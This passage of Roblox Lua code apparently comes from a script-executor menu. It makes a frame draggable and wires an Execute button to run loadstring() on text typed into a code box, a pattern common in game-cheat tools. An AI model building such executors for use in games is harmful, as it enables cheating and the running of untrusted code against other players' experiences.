end)

-- Scripts:

local function ENMM_fake_script() -- Main.LocalScript 
	local script = Instance.new('LocalScript', Main)

	ClientMenu = script.Parent
	ClientMenu.Active = true
	ClientMenu.Draggable = true
end
coroutine.wrap(ENMM_fake_script)()
local function VEGL_fake_script() -- Execute.LocalScript 
	local script = Instance.new('LocalScript', Execute)

	local exec = script.Parent
	local codeloader = script.Parent.Parent.ClientCoder
	exec.MouseButton1Click:Connect(function()
		loadstring(codeloader.Text)()
	end)
end
coroutine.wrap(VEGL_fake_script)()
